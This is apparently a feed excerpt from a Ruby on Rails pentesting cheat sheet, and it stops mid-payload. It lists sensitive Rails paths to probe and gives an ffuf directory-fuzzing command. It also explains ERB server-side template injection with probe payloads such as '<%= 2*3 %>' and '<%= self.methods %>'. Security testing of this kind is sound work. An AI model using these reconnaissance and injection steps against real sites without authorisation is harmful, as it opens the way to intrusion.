item.title: Ruby on Rails Pentesting
item.description: Common Directories link /assets/application.css /config /Gemfile /Gemfile.lock /rails/info /rails/info/properties /rails/info/routes In addition, itâ€™s worth to fuzz under /rails/ directory as below. ffuf -u https://example.com/rails/FUZZ -w wordlist.txt ERB Template Injection linkIf target website uses ERB template which affects a page, we can inject malicious template. text = "<%= 2*3 %>" result = ERB.new(text).result(binding) puts result # expected result: 6 Payloads linkReference: Server Side Template Injection <%= 2*3 %> <%= self.methods %> <%= self.
